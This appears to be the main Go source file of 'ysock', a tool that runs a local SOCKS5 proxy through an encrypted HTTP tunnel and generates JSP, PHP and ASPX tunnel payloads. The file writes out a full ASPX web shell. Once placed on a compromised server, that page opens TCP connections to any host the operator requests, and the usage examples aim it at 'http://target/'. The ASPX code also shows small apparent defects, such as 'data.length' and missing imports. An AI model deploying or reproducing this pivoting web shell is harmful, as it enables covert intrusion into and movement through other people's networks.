package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/y5neko/ysock/internal/logger"
	"github.com/y5neko/ysock/internal/payload"
	"github.com/y5neko/ysock/internal/socks"
	"github.com/y5neko/ysock/internal/tunnel"
)

const version = "1.0.0"

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}
	switch os.Args[1] {
	case "client":
		runClient(os.Args[2:])
	case "payload":
		runPayload(os.Args[2:])
	case "version":
		fmt.Printf("ysock v%s\n", version)
	default:
		printUsage()
		os.Exit(1)
	}
}

func runClient(args []string) {
	fs := flag.NewFlagSet("client", flag.ExitOnError)
	url := fs.String("u", "", "Payload URL")
	key := fs.String("k", "", "Encryption key")
	listen := fs.String("l", "127.0.0.1:1080", "SOCKS5 listen address")
	modeStr := fs.String("mode", "auto", "Tunnel mode: auto, full, half, classic")
	verbose := fs.Bool("v", false, "Verbose output (debug level)")
	logLevel := fs.String("log-level", "", "Log level: debug, info, error (overrides -v)")
	fs.Parse(args)
	if *url == "" || *key == "" {
		fmt.Println("Usage: ysock client -u <url> -k <key> [-l <addr>] [-mode <mode>] [-v]")
		os.Exit(1)
	}

	// 设置日志级别: --log-level 优先于 -v
	if *logLevel != "" {
		switch strings.ToLower(*logLevel) {
		case "debug":
			logger.SetLevel(logger.LevelDebug)
		case "info":
			logger.SetLevel(logger.LevelInfo)
		case "error":
			logger.SetLevel(logger.LevelError)
		default:
			fmt.Printf("Unknown log level: %s (use: debug, info, error)\n", *logLevel)
			os.Exit(1)
		}
	} else if *verbose {
		logger.SetLevel(logger.LevelDebug)
	} else {
		logger.SetLevel(logger.LevelInfo)
	}

	mode := tunnel.ParseMode(*modeStr)
	log.Printf("[ysock] starting client v%s", version)
	log.Printf("[ysock] payload: %s", *url)
	log.Printf("[ysock] mode:    %s", mode)
	log.Printf("[ysock] socks5:  %s", *listen)
	if logger.GetLevel() >= logger.LevelDebug {
		log.Printf("[ysock] log:     debug")
	}

	t := tunnel.NewTunnel(*url, *key, mode)
	if err := t.Run(); err != nil {
		log.Fatalf("[ysock] init error: %v", err)
	}
	log.Printf("[ysock] active mode: %s", t.Mode())
	defer t.Stop()
	srv := socks.NewServer(*listen, t.DialFunc())
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("[ysock] socks5 error: %v", err)
	}
}

func runPayload(args []string) {
	fs := flag.NewFlagSet("payload", flag.ExitOnError)
	t := fs.String("t", "", "Payload type: jsp, php, aspx")
	k := fs.String("k", "", "Encryption key")
	o := fs.String("o", "", "Output file")
	fs.Parse(args)
	if *t == "" || *k == "" {
		fmt.Println("Usage: ysock payload -t <type> -k <key> -o <output>")
		os.Exit(1)
	}
	var data string
	switch strings.ToLower(*t) {
	case "jsp":
		data = generateJSP(*k)
	case "php":
		data = generatePHP(*k)
	case "aspx":
		data = generateASPX(*k)
	default:
		fmt.Printf("Unsupported payload type: %s\n", *t)
		os.Exit(1)
	}
	outPath := *o
	if outPath == "" {
		outPath = "tunnel." + strings.ToLower(*t)
	}
	if err := os.WriteFile(outPath, []byte(data), 0644); err != nil {
		log.Fatalf("write payload: %v", err)
	}
	log.Printf("[ysock] payload written to %s", outPath)
}

func printUsage() {
	fmt.Printf("ysock v%s - HTTP-based SOCKS5 proxy with multiplexed tunneling\n", version)
	fmt.Println()
	fmt.Println("Commands:")
	fmt.Println("  client   Start SOCKS5 client")
	fmt.Println("  payload  Generate web payload script")
	fmt.Println("  version  Show version")
	fmt.Println()
	fmt.Println("Client flags:")
	fmt.Println("  -u <url>       Payload URL (required)")
	fmt.Println("  -k <key>       Encryption key (required)")
	fmt.Println("  -l <addr>      SOCKS5 listen address (default: 127.0.0.1:1080)")
	fmt.Println("  -mode <mode>   Tunnel mode: auto, full, half, classic (default: auto)")
	fmt.Println("  -v             Verbose output (debug level)")
	fmt.Println("  -log-level <l> Log level: debug, info, error (overrides -v)")
	fmt.Println()
	fmt.Println("Examples:")
	fmt.Println("  ysock client -u http://target/tunnel.php -k mysecret -l 127.0.0.1:1080")
	fmt.Println("  ysock client -u http://target/tunnel.jsp -k mysecret -v")
	fmt.Println("  ysock payload -t php -k mysecret -o tunnel.php")
}

func generatePHP(key string) string {
	return strings.Replace(payload.PHPTemplate, "$KEY = 'CHANGE_ME'", "$KEY = '"+key+"'", 1)
}

func generateJSP(key string) string {
	return strings.Replace(payload.JSPTemplate, `String KEY = "CHANGE_ME"`, `String KEY = "`+key+`"`, 1)
}

func generateASPX(key string) string {
	return fmt.Sprintf(`<%%@ Page Language="C#" %%>
<%%@ Import Namespace="System" %%>
<%%@ Import Namespace="System.IO" %%>
<%%@ Import Namespace="System.Net" %%>
<%%@ Import Namespace="System.Net.Sockets" %%>
<%%@ Import Namespace="System.Text" %%>
<%%@ Import Namespace="System.Security.Cryptography" %%>
<%%@ Import Namespace="System.Collections.Concurrent" %%>
<script runat="server">
static string KEY="%s";
static ConcurrentDictionary<int,Socket> sessions=new ConcurrentDictionary<int,Socket>();
static long counter=0;
static byte[] DK(string k){using(var s=SHA256.Create())return s.ComputeHash(Encoding.UTF8.GetBytes(k));}
static byte[] GKS(byte[] ek,byte[] n,int len){var ms=new MemoryStream();int c=0;while(ms.Length<len){using(var s=SHA256.Create()){var input=new byte[ek.Length+n.Length+4];Array.Copy(ek,0,input,0,ek.Length);Array.Copy(n,0,input,ek.Length,n.Length);input[ek.Length+n.Length]=(byte)(c>>24);input[ek.Length+n.Length+1]=(byte)(c>>16);input[ek.Length+n.Length+2]=(byte)(c>>8);input[ek.Length+n.Length+3]=(byte)c;var b=s.ComputeHash(input);int r=(int)(len-ms.Length);if(r>b.Length)r=b.Length;ms.Write(b,0,r);}c++;}return ms.ToArray();}
static byte[] CT(byte[] ak,byte[] n,byte[] d){using(var h=new HMACSHA256(ak)){using(var ms=new MemoryStream()){ms.Write(n,0,n.Length);ms.Write(d,0,d.Length);var hash=h.ComputeHash(ms.ToArray());var tag=new byte[16];Array.Copy(hash,0,tag,0,16);return tag;}}}
static byte[] Decrypt(byte[] data,string k){if(data.Length<28)return null;var kb=DK(k);using(var s=SHA256.Create()){var ek=s.ComputeHash(Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(kb)+"enc"));var ak=s.ComputeHash(Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(kb)+"auth"));var n=new byte[12];Array.Copy(data,0,n,0,12);var tag=new byte[16];Array.Copy(data,data.Length-16,tag,0,16);var ct=new byte[data.Length-28];Array.Copy(data,12,ct,0,ct.Length);var exp=CT(ak,n,ct);if(!exp.SequenceEqual(tag))return null;var ks=GKS(ek,n,ct.Length);var pt=new byte[ct.Length];for(int i=0;i<ct.Length;i++)pt[i]=(byte)(ct[i]^ks[i]);return pt;}}
static byte[] Encrypt(byte[] data,string k){var kb=DK(k);using(var s=SHA256.Create()){var ek=s.ComputeHash(Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(kb)+"enc"));var ak=s.ComputeHash(Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(kb)+"auth"));long c=Interlocked.Increment(ref counter);using(var s2=SHA256.Create()){var input=new byte[ek.Length+8];Array.Copy(ek,0,input,0,ek.Length);var cb=BitConverter.GetBytes(c);if(!BitConverter.IsLittleEndian)Array.Reverse(cb);Array.Copy(cb,0,input,ek.Length,8);var iv=s2.ComputeHash(input);var n=new byte[12];Array.Copy(iv,0,n,0,12);var ks=GKS(ek,n,data.length);var ct=new byte[data.Length];for(int i=0;i<data.Length;i++)ct[i]=(byte)(data[i]^ks[i]);var tag=CT(ak,n,ct);var result=new byte[12+ct.Length+16];Array.Copy(n,0,result,0,12);Array.Copy(ct,0,result,12,ct.Length);Array.Copy(tag,0,result,12+ct.Length,16);return result;}}}
static byte[] MkPkt(byte flag,int sid,int seq,int ack,byte[] data){using(var ms=new MemoryStream()){ms.WriteByte(flag);var b=BitConverter.GetBytes(sid);if(!BitConverter.IsLittleEndian)Array.Reverse(b);ms.Write(b,0,4);b=BitConverter.GetBytes(seq);if(!BitConverter.IsLittleEndian)Array.Reverse(b);ms.Write(b,0,4);b=BitConverter.GetBytes(ack);if(!BitConverter.IsLittleEndian)Array.Reverse(b);ms.Write(b,0,4);b=BitConverter.GetBytes(data.Length);if(!BitConverter.IsLittleEndian)Array.Reverse(b);ms.Write(b,0,4);if(data.Length>0)ms.Write(data,0,data.Length);return ms.ToArray();}}
</script>
<%%
Response.ContentType="application/json";string rd="";using(var sr=new StreamReader(Request.InputStream)){rd=sr.ReadToEnd();}
if(string.IsNullOrEmpty(rd)){Response.Write("{\"d\":\"\"}");return;}
var m=System.Text.RegularExpressions.Regex.Match(rd,"\"d\"\\s*:\\s*\"([^\"]+)\"");if(!m.Success){Response.Write("{\"d\":\"\"}");return;}
byte[] enc=Convert.FromBase64String(m.Groups[1].Value);byte[] raw=Decrypt(enc,KEY);if(raw==null){Response.Write("{\"d\":\"\"}");return;}
int off=0;int cnt=BitConverter.ToUInt16(new byte[]{raw[1],raw[0]},0);off+=2;var rp=new List<byte[]>();
for(int i=0;i<cnt;i++){byte flag=raw[off++];int sid=BitConverter.ToInt32(new byte[]{raw[off+3],raw[off+2],raw[off+1],raw[off]},0);off+=4;int seq=BitConverter.ToInt32(new byte[]{raw[off+3],raw[off+2],raw[off+1],raw[off]},0);off+=4;int ack=BitConverter.ToInt32(new byte[]{raw[off+3],raw[off+2],raw[off+1],raw[off]},0);off+=4;int dl=BitConverter.ToInt32(new byte[]{raw[off+3],raw[off+2],raw[off+1],raw[off]},0);off+=4;byte[] dd=new byte[dl];if(dl>0){Array.Copy(raw,off,dd,0,dl);off+=dl;}
switch(flag&0x0F){case 0x01:int hl=dd[0];string host=Encoding.UTF8.GetString(dd,1,hl);int port=(dd[1+hl]<<8)|dd[2+hl];try{var sock=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);sock.Connect(host,port);sock.Blocking=false;sessions[sid]=sock;rp.Add(MkPkt(0x04,sid,0,seq,new byte[0]));}catch{rp.Add(MkPkt(0x00,sid,0,seq,new byte[0]));}break;case 0x02:Socket cs;if(sessions.TryGetValue(sid,out cs)&&cs.Connected){try{cs.Send(dd);}catch{sessions.TryRemove(sid,out cs);cs.Close();}}rp.Add(MkPkt(0x04,sid,0,seq,new byte[0]));break;case 0x08:Socket fs;if(sessions.TryRemove(sid,out fs))try{fs.Close();}catch{}break;case 0x03:rp.Add(MkPkt(0x05,0,0,0,new byte[0]));break;}}
foreach(var kv in sessions){if(kv.Value.Connected&&kv.Value.Available>0){var buf=new byte[32768];int n=kv.Value.Receive(buf);if(n>0){var d=new byte[n];Array.Copy(buf,d,n);rp.Add(MkPkt(0x02,kv.Key,0,0,d));}}}
using(var ms=new MemoryStream()){var cb=BitConverter.GetBytes((short)rp.Count);if(!BitConverter.IsLittleEndian)Array.Reverse(cb);ms.Write(cb,0,2);foreach(var p in rp)ms.Write(p,0,p.Length);Response.Write("{\"d\":\""+Convert.ToBase64String(Encrypt(ms.ToArray(),KEY))+"\"}");}
%%>`, key)
}
